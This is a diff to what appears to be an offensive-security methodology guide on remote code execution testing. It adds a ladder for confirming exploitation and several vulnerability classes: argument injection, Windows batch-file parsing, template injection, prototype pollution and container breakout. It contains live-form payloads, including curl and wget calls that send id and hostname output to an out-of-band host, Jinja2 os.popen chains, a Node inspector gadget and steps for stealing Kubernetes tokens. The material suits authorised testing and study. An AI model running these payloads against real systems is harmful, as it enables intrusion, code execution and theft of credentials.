@@ -67,6 +67,19 @@ curl https://xyz.oast.fun/$(hostname)
 ;(id;hostname)|base64
 ```
 
+### Confirmation-Primitive Ladder
+
+Not every callback signal proves execution. Deserialization payloads like URLDNS (above) hit a DNS resolver without executing code; some SSRF chains reach an HTTP callback via a URL fetch, not an exec; a time delay may reflect a WAF's own artificial-delay behavior. The ladder — order signals by *what they prove*, not by *what they look like* — and pick the lowest rung that fits the sink so a false positive does not survive:
+
+- **Level 0 — DNS callback.** A DNS hit on `$(whoami).xyz.oast.fun` from a *string* sink (`sh -c` context) proves command substitution ran to compute the label. A DNS hit from a deserialization payload (URLDNS-shape) proves *only* that the deserializer resolved a URL, not that arbitrary code ran. Distinguish by payload class — a chain-of-classes payload that only reaches `URL.hashCode` is Level 0 detection, nothing more.
+- **Level 1 — HTTP callback.** An HTTP hit from `curl https://xyz.oast.fun/$(hostname)` proves both command substitution ran (`$(hostname)` computed) *and* the target has HTTP egress. Distinguishes from a raw DNS-only chain, but still fires from an SSRF sink that fetches URLs — separate the "target requested my URL" case from the "target ran my command that requested my URL" case.
+- **Level 2 — OOB file drop.** A command writes an attacker-supplied string to a location the attacker can read back — `curl -X POST xyz.oast.fun/x -d "$(id)"`, or `wget https://xyz.oast.fun/x?$(id | jq -sRr @uri)`. The callback body carries the exec output, so a reflected string with the target's actual `id` output proves exec ran *and* gives the primitive channel.
+- **Level 3 — In-band file drop.** The command writes to a serveable path on the target (`/var/www/html/x`, `/tmp/x`) and the attacker re-requests it. The re-request response carries the exec output — no OAST needed, so this works when egress is blocked. Requires write to a location the app serves.
+- **Level 4 — Time delay.** `; sleep 5` (or the Windows/PowerShell equivalents) plus a wall-clock measurement. Proves exec ran but not what ran; noisy against WAFs that hold or coalesce requests. Use only when Level 0–3 signals are unavailable.
+- **Level 5 — In-band exec-reflected output.** The response to the injection carries the command output directly — `; id` yields `uid=...` in the HTTP body. Proves exec ran AND channels the output back, so no separate exfil is needed. The strongest rung, but requires the sink to reflect and the WAF not to strip.
+
+The false-positive-discipline consequence: for deserialization findings, a `URLDNS`/DNS hit is Level 0 detection — do not report it as RCE without escalating to Level 2 or above with a distinct payload. For SSRF chains that reach an HTTP callback, the finding is SSRF until a command payload distinct from URL fetching produces a Level 2+ signal. Load `rce_advanced_deep` for the ladder applied to blind deserialization and second-order sinks.
+
 ## Key Vulnerabilities
 
 ### Command Injection
@@ -76,11 +89,13 @@ curl https://xyz.oast.fun/$(hostname)
 - Windows: `& | || ^`
 
 **Argument Injection**
-- Inject flags/filenames into CLI arguments (e.g., `--output=/tmp/x`, `--config=`)
-- Break out of quoted segments by alternating quotes and escapes
-- Environment expansion: `$PATH`, `${HOME}`, command substitution
-- Windows: `%TEMP%`, `!VAR!`, PowerShell `$(...)`
-- When a shell-free subprocess (`execve`/`subprocess.run([...])`) receives a user-controlled argument, load `argument_injection` to test option smuggling and any separately identified argv or secondary-parser boundary.
+
+An attacker-controlled string reaching an argv position that a downstream binary interprets as an *option* — where that option itself calls a shell or reads a file — is the class the array-form boundary leaves open. The primitive is not "chain a second command" (the array form still blocks that); it is "reach a documented sub-sink the tool itself hosts." Two anchors from the 2025–2026 frontier:
+
+- **CVE-2025-21613** (go-git < 5.13.0, CVSS 9.8, CWE-88): a controllable clone URL reaches `git-upload-pack` argv. The `file://` transport is the *only* go-git transport that shells out to a git binary (`plumbing/transport/file/client.go` invokes `execabs.Command` on `git-upload-pack`/`git-receive-pack`); other transports (HTTP, SSH-native) do not, so this bug scopes strictly to `file://`. Primitive: attacker URL → arbitrary git-upload-pack flags → RCE when a flag reaches a shell sub-sink. The successor **CVE-2026-45570** (go-git < 5.19.1, CVSS 9.6) closes the same class in the SSH transport — a sibling seam the file://-transport fix did not cover.
+- **CVE-2026-52806** (Gogs < 0.14.3, CVSS 9.9): an unprotected branch name reaches `git rebase --quiet <base> <head>` at `internal/database/pull.go:282`. A branch of the form `--exec=<cmd>` is interpreted as git's `--exec` flag, and `git rebase --exec` is *documented* to invoke its argument via `sh -c` after every replayed commit — the promotion is direct, not option-confusion. Published PoC uses `${IFS}` to work around the space-in-branch-name limitation.
+
+The class fingerprint: any tool whose flag list includes an option that runs a subprocess (`git --exec`, `curl --config` for a file with directives, `ssh -o ProxyCommand=`, `rsync -e`, `tar --use-compress-program=`, `ffmpeg` protocol/concat with a lax `protocol_whitelist`, ImageMagick delegates), reached via an argv position the attacker controls. Fixing the specific flag does not close the class — the next flag with the same shape is available. Encoding/breakout mechanics (quote alternation, `$PATH`/`${HOME}` expansion, `%TEMP%`/`!VAR!` on Windows, PowerShell `$(...)`) are options for reaching non-shell positional sinks. Load `argument_injection` for the general option-smuggling and end-of-options-delimiter methodology, `rce_advanced_deep` for the per-tool sub-sink matrix.
 
 **Path and Builtin Confusion**
 - Force absolute paths (`/usr/bin/id`) vs relying on PATH
@@ -115,30 +130,66 @@ still attacker-controlled, so pivot to **option/operand injection** (a leading
 `-`/`--flag`, a response/config file, a subcommand). Load `argument_injection`
 for that residual, which is exactly the boundary the array form leaves open.
 
+**Windows CreateProcess / cmd.exe parser-differential — the exception to "array-form is safe from chaining."** When the *resolved target* of an array-form spawn is a `.bat` or `.cmd` file, Win32 `CreateProcess` implicitly launches `cmd.exe` as the interpreter and reconstructs the command line, re-parsing it under cmd's rules (`& | ^` and quoting differ from the C-runtime argv rules the calling runtime already applied). The array boundary is broken by the OS layer, not the runtime — this is the **BatBadBut** class. Two verifiable Node.js anchors and one multi-vendor coordinated disclosure cluster:
+
+- **CVE-2024-27980** (Node.js, HIGH 8.1): `child_process.spawn`/`spawnSync` with `shell:false`, target `.bat`/`.cmd`, injected `& id` in an argv element executes. Fixed 18.20.2 / 20.12.2 / 21.7.3.
+- **CVE-2024-36138** (Node.js, HIGH 8.1): "Bypass incomplete fix of CVE-2024-27980" — the `-27980` fix missed batch-file variants with mixed case and other extension shapes. Fixed 18.20.4 / 20.15.1 / 22.4.1. The successor is the durability signal: the class is a stratum, not one CVE.
+- The April 2024 coordinated disclosure cluster expressed the same OS-layer differential across runtimes — **CVE-2024-24576** (Rust std < 1.77.2, CVSS 10.0), **CVE-2024-1874** (PHP `proc_open` array-syntax escaping, fixed 8.1.28 / 8.2.18 / 8.3.5), **CVE-2024-22423** (yt-dlp `--exec` with `%q`, fixed 2024.04.09), **CVE-2024-3566** (multi-vendor CreateProcess, CVSS 9.8, Haskell `process` < 1.6.19.0 and Node.js Windows).
+
+Cross-runtime remediation stratified at disclosure: Node / Rust / PHP / Haskell shipped patches; Go, Python, Ruby, Erlang shipped documentation-only updates; Java was labelled *won't fix*. A call from Java `Runtime.exec` array form to a `.bat` target on Windows in 2026 is structurally vulnerable, and the mitigation is cmd.exe-specific escaping at the caller, not a stdlib fix. Load `rce_advanced_deep` for the full cross-runtime remediation table and the reusable class fingerprint.
+
 ### Template Injection
 
-Load `ssti` for the full template-injection probe catalog — engine
-fingerprinting (`{{7*7}}`/`${7*7}`/`<%= 7*7 %>`), per-engine gadget chains
-(Jinja/Twig/Freemarker/Velocity/Thymeleaf/ERB/EJS/Nunjucks), and sandbox
-escapes. As an RCE sink it is one of the highest-yield paths: a `{{7*7}}`→`49`
-*evaluation* (not literal reflection) is server-side code execution. The
-RCE-specific extensions (post-exploitation, shell stabilization, cross-language
-exec sinks above) are here; the probe/gadget catalog lives in `ssti`.
+A `{{7*7}}` → `49` *evaluation* (not literal reflection) is server-side code execution — the template engine is a code-eval sink whose input surface a developer often mistakes for user data rather than program text. Load `ssti` for the engine probe catalog and per-engine gadget chains (Jinja/Twig/Freemarker/Velocity/Thymeleaf/ERB/EJS/Nunjucks). Here: the transition to exec, and the sandboxed-vs-unsandboxed engine differential that decides whether the class is available at all.
+
+**The class-walk chain.** The canonical Python/Jinja2 transition traverses the object graph reachable from any template-visible object (`self`, a passed variable, `lipsum`, `cycler`) to reach `os.popen` — arbitrary Python execution in the rendering process:
+```
+{{ lipsum.__globals__['os'].popen('id').read() }}
+{{ self.__init__.__globals__.__builtins__['__import__']('os').popen('id').read() }}
+```
+The confirmation signal is in-band echo of the command output — no OAST needed when the template result reflects to the response.
+
+**The sandboxed-vs-unsandboxed differential.** Jinja2 ships two environments: `jinja2.Environment` (default, no sandbox) and `jinja2.sandbox.SandboxedEnvironment` (blocks `__`-prefixed attribute access via `is_safe_attribute`). Applications rendering user-controlled template text through the default `Environment` — including `Template(content).render()` — expose the class-walk chain immediately. Two 2026 CVEs make the class concrete:
+
+- **CVE-2026-27961** (Agenta ≤ 0.86.7, CVSS 8.8, fixed 0.86.8): renders through unsandboxed `Template(content).render()` at `sdk/agenta/sdk/workflows/handlers.py:283` when `template_format=jinja2`. Advisory publishes `{{ lipsum.__globals__['os'].popen('id').read() }}` as attack vector.
+- **CVE-2026-31864** (JumpServer ≤ 3.10.21 / ≤ 4.10.15, CVSS 6.8): `Environment()` in `apps/common/utils/yml.py::yaml_load_with_i18n()` renders a user-uploaded manifest.yml. Advisory publishes the `self.__init__.__globals__.__builtins__` chain.
+
+The differential is a grep — `SandboxedEnvironment` vs `Environment` on the render path. Miss the sandbox marker or miss the class-walk-attribute filter and the finding is available.
+
+**JavaScript template layers escape via `constructor.constructor` → `Function()`.** ECMA-262 `Function(str)` compiles its argument as code; any expression language handing out a property-access primitive over user objects walks `x.constructor.constructor(...)` to `Function` and evaluates an arbitrary string. **CVE-2024-55652** (pwndoc, fixed 1.0.0): a custom `select` filter fetched arbitrary `attr` properties without prototype-chain restriction; the published PoC reaches `Function` and then `process.binding('spawn_sync').spawn({file:'/bin/sh', args:['sh','-c','id'], ...}).output.toString()`. **CVE-2026-23830** (SandboxJS) confirms the primitive is still exploited where property access is unrestricted.
+
+Empirical baseline: TEFuzz (USENIX Security 2023, Zhao/Zhang/Yang, Fudan) discovered 135 previously-unknown template-escape bugs across 7 PHP template engines and auto-synthesized working RCE exploits for 55 of them. Assume any sandboxed template engine is escapable in practice until proven otherwise; the sandbox is a mitigation, not a boundary. Load `ssti` for the per-engine probe/gadget catalog and `rce_novel_deep` for the class-walk / constructor-chain frontier.
 
 ### Deserialization and Expression Languages
 
-Load `insecure_deserialization` for the full gadget-chain catalog — Java native
-/ Jackson / Fastjson autotype, .NET `BinaryFormatter`/ViewState, PHP
-`unserialize`/Phar, Python pickle/PyYAML, Ruby Marshal, and the
-ysoserial/phpggc/ysoserial.net tooling. It is the canonical owner; confirm the
-sink with an OAST/`URLDNS`-style no-exec callback before any command chain.
+Load `insecure_deserialization` for the full gadget-chain catalog — Java native / Jackson / Fastjson autotype, .NET `BinaryFormatter` / ViewState, PHP `unserialize` / Phar, Python pickle / PyYAML, Ruby Marshal, and the ysoserial / phpggc / ysoserial.net tooling. It is the canonical owner. Here: the false-positive discipline that decides whether a deserialization signal proves exec, and the supply-chain reframing that decides whether the class is exploitable at all on a given target.
 
-Expression languages (OGNL, SpEL, MVEL, JSP EL) reach `Runtime`/`ProcessBuilder`
-the same way — SpEL/Thymeleaf specifically is covered in `ssti`; Struts-style
-OGNL and standalone EL injection are code-eval sinks that land at the same
-execution boundary the RCE-specific material here extends. JNDI/LDAP lookups
-(Log4Shell-style) reach code execution through a *different* input path than
-deserialization — see the JNDI-pivot discussion in `insecure_deserialization`.
+**URLDNS is detection-only, not execution.** The ysoserial `URLDNS` gadget deserializes a `HashMap` whose `readObject` computes `HashMap.hash` for a `URL` key; `URL.hashCode` resolves the URL's hostname via DNS. It reaches the DNS resolver *and no other sink*. A Collaborator DNS hit on a `URLDNS` payload proves that **untrusted deserialization occurred** — not that arbitrary code executed. Every other ysoserial gadget requires classpath conditions (specific library on the CLASSPATH, an unsafe deserialization sink in the application); URLDNS requires only the JVM's built-in `HashMap`+`URL`. Treat URLDNS as the confirmation-ladder Level 0 primitive — a class-of-sink probe, not an exec proof.
+
+**Gadget-chain reachability is a supply-chain property that fluctuates over a dependency's history.** Class serializability is not a static attribute — small, transitive changes to a dependency's history can create the class-graph conditions for a new chain. The Sleeping Giants study (Kreyssig/Houy/Riom/Bartel, ACM CCS 2025) applied three modification patterns (Transitive Serializability, Final Properties, Interface Method Reachability) to 533 Maven dependencies and produced new detections in 26.08% of them; manual verification confirmed dormant chains in 53 dependencies, with 49.06% of true positives requiring only one pattern. Consequence for the assessor: "the app doesn't call the gadget class" is not a mitigation — chain construction is constrained only by **what classes are on the classpath**, including transitively-included libraries the application never invokes. The majority pattern in publicly-known chains is runtime polymorphism at the deserializer's trampoline (`Object.hashCode()`, `Runnable.run()`) — 22 of 34 ysoserial payloads rely on trampoline gadgets per Sleeping Giants (ICSE'25 count). JEP 290 `ObjectInputFilter` and JPMS module boundaries are mitigations that operate *on top of* the classpath-composition constraint, not refutations of it. Load `rce_advanced_deep` for the confirmation-primitive ladder in depth, `rce_novel_deep` for the current supply-chain reframing frontier.
+
+Expression languages (OGNL, SpEL, MVEL, JSP EL) reach `Runtime`/`ProcessBuilder` the same way — SpEL/Thymeleaf specifically is covered in `ssti`; Struts-style OGNL and standalone EL injection are code-eval sinks that land at the same execution boundary. JNDI/LDAP lookups (Log4Shell-style) reach code execution through a *different* input path than deserialization — see the JNDI-pivot discussion in `insecure_deserialization`.
+
+### Prototype Pollution to Exec
+
+Node.js prototype pollution reaches command execution through gadgets in the standard library that read attacker-writable properties from `Object.prototype` before dispatching to a shell, a module loader, or the V8 debugger. This is *not* the CSP-tier bypass class; it is a first-class RCE primitive when the target ever pollutes and then spawns anything downstream.
+
+**Universal `child_process` gadget.** Silent Spring (Shcherbakov/Balliu/Staicu, USENIX Security 2023) shows that every `child_process` command API (`spawn`, `spawnSync`, `exec`, `execSync`, `execFileSync`, `fork`) reads from a polluted `Object.prototype.shell` and `Object.prototype.env` when the call site does not pass an explicit `options` argument. The gadget landing the exec primitive on any subsequent spawn:
+```
+Object.prototype.shell = 'node';
+Object.prototype.env = {};
+Object.prototype.env.NODE_OPTIONS = '--inspect-brk=0.0.0.0:1337';
+// any child_process spawn after this launches Node with V8 inspector open → attach → arbitrary JS
+```
+Primitive: attacker-reachable Node inspector on any subsequent Node subprocess spawn. Confirmation signal: `curl http://target:1337/json/version` returns a `webSocketDebuggerUrl` — attach with `chrome://inspect` or a client and pin arbitrary JS. Corollary: any Node app vulnerable to prototype pollution that shells out post-pollution is vulnerable to RCE. The mitigation is the call site — `spawn(cmd, args, { shell: false, env: process.env })` immunizes even with a polluted prototype.
+
+**`require()` and `import()` gadgets — in-process, no child_process.** GHunter (Cornelissen/Shcherbakov/Balliu, USENIX Security 2024) systematizes the runtime gadget surface: 56 universal PP gadgets in Node.js v21.0.0, 67 in Deno v1.37.2. Three concrete `require`/`import` gadgets:
+
+- **`require()` gadget A** — polluting `Object.prototype.main` makes `require()` of a package whose `package.json` lacks a `main` field fall through to the polluted value and load the attacker-chosen file.
+- **`require()` gadget B** — **CVE-2023-31414** (CVSS 9.1, exploited end-to-end in Kibana 8.7.0, patched Node.js v18.19.0): when `readPackage()` misses `package.json` it returns `false`; `(false)?.main` traverses `Object.prototype` because `Boolean` inherits from `Object.prototype`, so a polluted `main` reaches `tryPackage()` and is loaded and evaluated.
+- **`import()` gadget** — pollute `Object.prototype.source` with attacker-supplied JavaScript, then invoke `import()` on any `.mjs` file; the polluted `source` value is evaluated as module code.
+
+Primitive: in-process arbitrary JavaScript in the Node.js runtime. Confirmation signal: the attacker code runs inside the Node process — a side-effect (file drop), a callback, or in-band stdout serves as proof. Load `prototype_pollution` for the source-of-pollution methodology (Lodash-family merge sinks, unmerged `Object.assign` on user JSON, query-string parsers) and `rce_novel_deep` for the GHunter per-impact table and the Deno-specific gadget set.
 
 ### Media and Document Pipelines
 
@@ -181,17 +232,21 @@ pop graphic-context
 
 ### Container and Kubernetes
 
-**Docker**
+The RCE-in-container → node/host RCE transition is a separate escalation surface — `cloud/kubernetes.md` owns the full K8s escape catalog (privileged pod escape, hostPath, daemonset persistence, kubelet 10250/10255 primitives, node lateral movement). Here: the two 2024 runtime-layer classes that promote the transition, and the enumeration order.
+
+**Docker enumeration**
 - From app RCE, inspect `/.dockerenv`, `/proc/1/cgroup`
 - Enumerate mounts and capabilities: `capsh --print`
-- Abuses: mounted docker.sock, hostPath mounts, privileged containers
+- Abuses: mounted `docker.sock` (writable = host takeover), hostPath mounts, privileged containers
 - Write to `/proc/sys/kernel/core_pattern` or mount host with `--privileged`
 
-**Kubernetes**
-- Steal service account token from `/var/run/secrets/kubernetes.io/serviceaccount`
-- Query API for pods/secrets; enumerate RBAC
-- Talk to kubelet on 10250/10255; exec into pods
+**Kubernetes enumeration**
+- Steal service-account token from `/var/run/secrets/kubernetes.io/serviceaccount/token`
+- Query API for pods/secrets, enumerate RBAC
+- Talk to kubelet on 10250/10255, exec into pods
 - Escalate via privileged pods, hostPath mounts, or daemonsets
+
+**runc "Leaky Vessels" — the 2024 runtime-layer container-to-host breakout.** **CVE-2024-21626** (runc < 1.1.12, HIGH 8.6): runc leaks host-side directory file descriptors into `runc init`. If the container's OCI `process.cwd` (set by the Dockerfile `WORKDIR` directive) points at `/proc/self/fd/<n>`, runc `chdir()`s into that path *before* closing the leaked fds and *without* verifying the final working directory is inside the container mount namespace — the container's pid 1 has a working directory in the host mount namespace. Primitive: container-to-host breakout with (i) read on sensitive host files, (ii) arbitrary-file-write on the host filesystem. Two delivery vectors: (a) the victim builds or runs a malicious image whose Dockerfile carries the crafted `WORKDIR /proc/self/fd/<n>`, (b) the attacker already inside a running container invokes `runc exec` with the malicious path. Confirmation signal: from inside the container, resolving `cwd` or accessing `../` from cwd reads/writes host-namespace paths. Patched in runc 1.1.12. Load `rce_novel_deep` for the full delivery mechanics and the BuildKit surface adjacent to this class.
 
 ## Bypass Techniques
 
